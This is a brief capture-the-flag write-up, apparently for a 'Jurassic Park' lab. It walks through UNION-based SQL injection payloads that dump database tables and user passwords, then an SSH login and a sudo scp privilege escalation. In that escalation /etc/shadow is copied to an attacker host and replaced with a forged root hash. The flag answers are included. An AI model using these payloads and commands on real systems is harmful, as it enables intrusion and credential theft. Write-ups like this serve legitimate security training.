# Jurassic Park -sqli

## Sqlinjection vuln in item.php?id=

```
http://jurassic.thm/item.php?id=1 union select 1,2,3,4,5 #

id=1 union select 1,2,3,4,database() #

	park of these packages have been sold in the last hour.

id=1 union select 1,2,3,4,group_concat(table_name) from information_schema.tables where table_schema=database() #

	items,users of these packages have been sold in the last hour.

id=1 union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_schema=database() #

	id,package,price,information,sold,id,username,password of these packages have been sold in the last hour.

id=1 union select 1,2,3,4, version() #

	<b>5.7.25-0ubuntu0.16.04.2</b>

# PAYLOAD DUMP CREDENTIALS 

id=1 union select 1,2,3,4,group_concat(password) from users #
	D0nt3ATM3
	ih8dinos

```

### First access with ssh {dennis:ih8dinos} && Privilege escalation
```
flag: b89f2d69c56b9981ac92dd267f
flag2: 96ccd6b429be8c9a4b501c7a0b117b0a

dennis@ip-10-10-85-179:/home$ find / -name flag*.txt 2>/dev/null
	/home/dennis/flag1.txt
	/boot/grub/fonts/flagTwo.txt



dennis@ip-10-10-85-179:/$ sudo -l
    (ALL) NOPASSWD: /usr/bin/scp

dannis can run scp with root, use it to transfer /etc/shadow 

> dennis@ip-10-10-85-179:/$ sudo -u root /usr/bin/scp /etc/shadow kali@10.9.9.124:/home/kali

Create password hash and edit shadow file

> openssl passwd -6 -salt nothing password

root:$6$nothing$creXYt9aVGarMfNqn4XmctIp9BAzDfbCj9CUFelbTb0WiugUlxgVFBmzWzqpYjdVd7duTrAf5RsQhQe1kqo4H0:17849:0:99999:7:::

copy the file and replace with the current one

> dennis@ip-10-10-85-179:/$ sudo -u root /usr/bin/scp -r kali@10.9.9.124:/home/kali/shadow /etc/

> su root
	root:password

root@ip-10-10-85-179:/# 

```

Flag3 found in dennis bash_history
